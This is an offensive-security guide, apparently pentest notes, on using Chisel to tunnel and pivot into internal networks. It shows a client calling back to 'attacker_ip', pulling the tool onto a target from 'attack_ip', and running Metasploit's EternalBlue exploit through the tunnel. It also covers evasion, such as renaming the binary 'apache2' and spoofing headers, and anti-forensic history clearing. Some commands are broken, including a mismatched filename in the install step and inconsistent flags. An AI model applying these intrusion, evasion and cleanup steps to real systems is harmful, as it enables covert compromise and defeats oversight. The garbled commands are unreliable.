# 🛰️ Chisel Tunneling Tool Guide

## 🔍 Overview [!ABSTRACT]
Chisel is a lightweight reverse SSH tunnel and HTTP proxy, facilitating remote access and pivoting within networks. It supports various protocols (SOCKS5, HTTP) and encryption methods (SSH), offering cross-platform compatibility.

## 🚀 Installation & Setup [!INFO]

### 📦 Installing Chisel
```bash
# Download the latest release binary
wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz

# Decompress and move to /usr/local/bin/
gunzip chisel_1.7.6_linux_amd64.gz
sudo mv chisel_1.138_linux_amd64 /usr/local/bin/chisel
```

### 🛠️ Building from Source [!INFO]
```bash
# Prerequisites
go get -u github.com/jpillora/chisel/cmd/chisel

# Build
go build -ldflags="-linkmode external -extldflags '-static'" github.com/jpillora/chisel/cmd/chisel
```

## 🔗 Running Chisel [!SUCCESS]

### 🌐 Basic Commands [!NOTE]
```bash
# Server Mode (Listen on port 1234 for SOCKS5 connections)
./chisel server -p 1234 --socks5

# Client Mode (Connect to a listening server, e.g., ws://attacker_ip:1234 and proxy traffic via socks)
./chisel client ws://attacker_ip:1234 socks
```

### 🚦 Configurations [!INFO]
- **SSH Encryption**: `--ssh`
- **Compression**: `-c` (default enabled, use `-nocompress` to disable)
- **Custom Headers**: `--headers "..."`

## 🔎 Troubleshooting & Common Issues [!WARNING]

#### 💥 Binary Compatibility Errors
```bash
# Problem: Unsupported binary type
server: unsupported binary, expected linux/amd64

# Solutions:
1. Use older Chisel version (v1.7.6)
   wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz

2. Static compilation
   go build -ldflags="-linkmode external -extldflags -static"

3. Use compatible binary for target OS
```

#### 💥 Connection Issues
```bash
# Problem: Connection refused
client: Connecting to ws://10.129.202.64:1234
client: dial tcp 10.129.202.64:1234: connection refused

# Solutions:
1. Check server is running
   ps aux | grep chisel

2. Verify port is listening
   netstat -tlnp | grep 1234

3. Check firewall rules
   sudo ufw status
```

#### 💥 SOCKS Version Mismatch (COMMON) [!ERROR]
```bash
# Problem: Chisel server shows version errors
[ERR] socks: Unsupported SOCKS version: [4]
tun: conn#1: Close [0/1] (error Unsupported SOCKS version: [4])

# Root Cause: proxychains.conf uses socks4, but Chisel provides socks5

# Solution: Fix proxychains configuration
sudo nano /etc/proxychains4.conf

# Change from:
socks4 127.0.0.1 1080

# To:
socks5 127.0.0.1 1080

# Verify fix:
tail -n5 /etc/proxychains4.conf
```

#### 💥 SOCKS Proxy Not Working [!WARNING]
```bash
# Problem: proxychains connection fails
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-request| 172.16.5.19
|S-chain|-<>-127.0.0.1:1080-<><>-4.2.2.1:53-<><>-OK
|DNS-response| 172.16.5.19 is 172.16.5.19

# Solutions:
1. Check SOCKS proxy is listening
   netstat -tlnp | grep 1080

2. Test with simple command
   proxychains curl http://172.16.5.19

3. Verify proxychains.conf
   tail /etc/proxychains.conf
```

#### 💥 Binary Transfer Issues [!WARNING]
```bash
# Problem: SCP permission denied
scp: /tmp/chisel: Permission denied

# Solutions:
1. Transfer to user home directory
   scp chisel ubuntu@target:~/

2. Use different transfer method
   # Python HTTP server
   python3 -m http.server 8000
   # On target: wget http://attack_ip:8000/chisel

3. Check disk space
   df -h /tmp
```

## 🚀 Performance Optimization [!INFO]
```bash
# Increase connection timeout
./chisel client --keepalive 30s target:1234 socks

# Disable compression for speed
./chisel server --no-compression -p 1234 --socks5

# Use different ports to avoid conflicts
./chisel server -p 8080 --socks5   # Server port
./chisel client target:8080 socks  # SOCKS on 1080
```

---

## 🔐 Operational Security (OPSEC) [!INFO]

### 🛡️ Stealth Considerations [!WARNING]
1. **HTTP Traffic** - appears as web traffic
2. **Custom User-Agent** - avoid detection signatures
3. **Port Selection** - use common HTTP ports (80, 8080, 8000)
4. **Traffic Analysis** - WebSocket upgrade patterns
5. **Binary Artifacts** - temporary files, process names

### 🛡️ Detection Evasion [!WARNING]
```bash
# Use common ports
./chisel server -p 80 --socks5        # HTTP port
./chisel server -p 443 --socks5       # HTTPS port

# Custom headers to blend in
./chisel server --headers "Server: Apache/2.4.41"

# Process name obfuscation
cp chisel apache2
./apache2 server -p 80 --socks5
```

### 🛡️ Cleanup Commands [!WARNING]
```bash
# Remove binary artifacts
rm -f chisel*
rm -f /tmp/chisel*

# Clear command history
history -c
unset HISTFILE

# Kill background processes
pkill -f chisel
```

---

## 💼 Integration with Other Tools [!INFO]

### 🛠️ Metasploit Integration [!NOTE]
```bash
# Use Chisel SOCKS proxy with Metasploit
echo "setg Proxies socks5:127.0.0.1:1080" > /tmp/msf_proxy.rc
msfconsole -r /tmp/msf_proxy.rc

# All Metasploit traffic now goes through Chisel tunnel
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.16.5.19
exploit
```

### 🛠️ Nmap through Tunnel [!NOTE]
```bash
# Scan internal network through SOCKS proxy
proxychains nmap -sT -Pn 172.16.5.0/24

# Service enumeration
proxychains nmap -sT -Pn -sV -p 80,443,3389 172.16.5.19
```

### 🛠️ Web Application Testing [!NOTE]
```bash
# Configure Burp Suite to use SOCKS proxy
# Proxy settings: 127.0.0.1:1080 SOCKS5

# Browser with proxy
proxychains firefox http://172.16.5.19/webapp
```

---

## 🧭 Alternative Tools Comparison [!INFO]

### 💡 Chisel vs Similar Tools [!NOTE]
| **Tool** | **Protocol** | **Encryption** | **Proxy Type** | **Platform** | **Size** |
|----------|--------------|----------------|----------------|--------------|----------|
| **Chisel** | HTTP/WebSocket | SSH | SOCKS4/5, HTTP | Cross-platform | ~11MB |
| **SSF** | TCP | TLS | SOCKS4/5 | Cross-platform | ~15MB |
| **ngrok** | HTTP/HTTPS | TLS | HTTP | Cross-platform | ~25MB |
| **frp** | TCP/HTTP | TLS | Multiple | Cross-platform | ~20MB |
| **Ligolo** | TUN/TAP | TLS | Network layer | Cross-platform | ~10MB |

### 💡 When to Choose Chisel [!SUCCESS]
✅ **HTTP-friendly environments**  
✅ **WebSocket support required**  
✅ **SSH encryption needed**  
✅ **Cross-platform compatibility**  
✅ **SOCKS proxy functionality**  
✅ **Moderate binary size (~11MB)**  

---

## 📚 References & Resources
- Chisel GitHub: https://github.com/jpillora/chisel

---


# End of Guide [!INFO]